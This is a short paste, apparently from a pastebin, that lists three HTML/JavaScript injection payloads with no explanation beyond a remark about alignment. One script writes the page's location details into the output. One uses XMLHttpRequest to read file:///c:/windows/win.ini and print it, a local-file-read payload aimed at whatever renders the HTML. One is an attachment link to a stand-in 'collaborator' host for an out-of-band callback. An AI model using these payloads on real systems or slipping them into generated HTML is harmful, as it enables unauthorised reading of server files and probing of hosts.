Click on [RAW] for better understanding, i'm too lazy to allign everything.

<script>
  document.write(window.location.href);
  document.write(window.location.hostname);
  document.write(window.location.pathname);
  document.write(window.location.protocol);
  document.write(window.location.host);
  document.write(window.location.port);
</script>
---------------------------------------------------------------
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///c:/windows/win.ini");
x.send();
</script>
------------------------------------------------------------------------------------------
<a rel='attachment' href='http://collaborator'>
